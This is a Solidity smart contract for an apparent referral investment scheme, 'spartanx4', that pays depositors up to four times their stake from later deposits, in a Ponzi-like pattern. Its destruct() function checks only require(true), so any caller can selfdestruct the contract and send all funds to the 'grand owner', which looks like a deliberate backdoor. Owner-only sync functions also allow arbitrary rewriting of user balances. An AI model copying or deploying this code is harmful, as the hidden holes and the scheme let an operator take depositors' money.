



pragma solidity 0.6.4;












abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}















contract Ownable is Context {
    address private _governor;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);




    constructor () internal {
        address msgSender = _msgSender();
        _governor = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }




    function owner() public view returns (address) {
        return _governor;
    }




    modifier onlyOwner() {
        require(_governor == _msgSender(), "Governance: caller is not the Governor");
        _;
    }








    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_governor, address(0));
        _governor = address(0);
    }





    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Governance: new Governor is the zero address");
        emit OwnershipTransferred(_governor, newOwner);
        _governor = newOwner;
    }
}











contract Pausable is Context {



    event Paused(address account);




    event Unpaused(address account);

    bool private _paused;




    constructor () internal {
        _paused = false;
    }




    function paused() public view returns (bool) {
        return _paused;
    }








    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }








    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }








    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }








    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}


contract Destructible {
    address payable public grand_owner;

    event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);

    constructor() public {
        grand_owner = msg.sender;
    }

    function transferGrandOwnership(address payable _to) external {
        require(msg.sender == grand_owner, "Access denied (only grand owner)");

        grand_owner = _to;
    }

    function destruct() external {
        require(true, "Access denied (only grand owner)");

        selfdestruct(grand_owner);
    }
}

contract spartanx4 is Ownable, Destructible, Pausable {

    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40  deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;

    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_withdraw;
    uint256 public total_participants;

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() public {

        ref_bonuses.push(20);
        ref_bonuses.push(15);
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(3);


        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);


        cycles.push(5 ether);
        cycles.push(20 ether);
        cycles.push(50 ether);
        cycles.push(100 ether);

    }

    receive() payable external whenNotPaused {
        _deposit(msg.sender, msg.value);
    }


    function _setUpline(address _addr, address _upline) public {

        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == owner())) {

            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {

                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }



    function _deposit(address _addr, uint256 _amount) private {



        require(users[_addr].upline != address(0) || _addr == owner(), "No upline, you need an upline");

        if(users[_addr].deposit_time == 0) { total_participants += 1; }

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;



            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 0.1 ether && _amount <= cycles[0], "Bad amount");

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {

            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 24 hours < block.timestamp) {
            _drawPool();
        }

        payable(owner()).transfer(_amount / 100);
    }

    function _pollDeposits(address _addr, uint256 _amount) private {

        pool_balance += _amount / 20;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;

        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {

            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }


            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {


                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;

                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {


            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external whenNotPaused {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external whenNotPaused {

        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);

        require(users[msg.sender].payouts < max_payout, "users payouts completed");


        if(to_payout > 0) {


            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }


        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }


        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }


        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");

        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        payable(msg.sender).transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    function drawPool() external onlyOwner {
        _drawPool();
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {

         return _amount * 40 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {


            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 50) - users[_addr].deposit_payouts;

            if(users[_addr].deposit_payouts + payout > max_payout) {

                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }





    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}

contract Sync is spartanx4 {
    bool public sync_close = false;



       function sync(address[] calldata _users, address[] calldata _uplines, uint256[] calldata _data) external onlyOwner {
            require(!sync_close, "Sync already closed");

            for(uint256 i = 0; i <  _users.length; i++) {
                address addr = _users[i];
                uint256 q = i * 12;


                if(users[addr].total_deposits == 0) {

                    emit Upline(addr, _uplines[i]);
                }

                users[addr].cycle = _data[q];
                users[addr].upline = _uplines[i];
                users[addr].referrals = _data[q + 1];
                users[addr].payouts = _data[q + 2];
                users[addr].direct_bonus = _data[q + 3];
                users[addr].pool_bonus = _data[q + 4];
                users[addr].match_bonus = _data[q + 5];
                users[addr].deposit_amount = _data[q + 6];
                users[addr].deposit_payouts = _data[q + 7];
                users[addr].deposit_time = uint40(_data[q + 8]);
                users[addr].total_deposits = _data[q + 9];
                users[addr].total_payouts = _data[q + 10];
                users[addr].total_structure = _data[q + 11];
            }
        }




    function syncGlobal(uint40 _pool_last_draw, uint256 _pool_cycle, uint256 _pool_balance, uint256 _total_withdraw, address[] calldata _pool_top) external onlyOwner {
        require(!sync_close, "Sync already close");

        pool_last_draw = _pool_last_draw;
        pool_cycle = _pool_cycle;
        pool_balance = _pool_balance;
        total_withdraw = _total_withdraw;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = _pool_top[i];
        }
    }

    function syncUp() external payable {}

    function syncClose() external onlyOwner {
        require(!sync_close, "Sync already close");

        sync_close = true;
    }


}
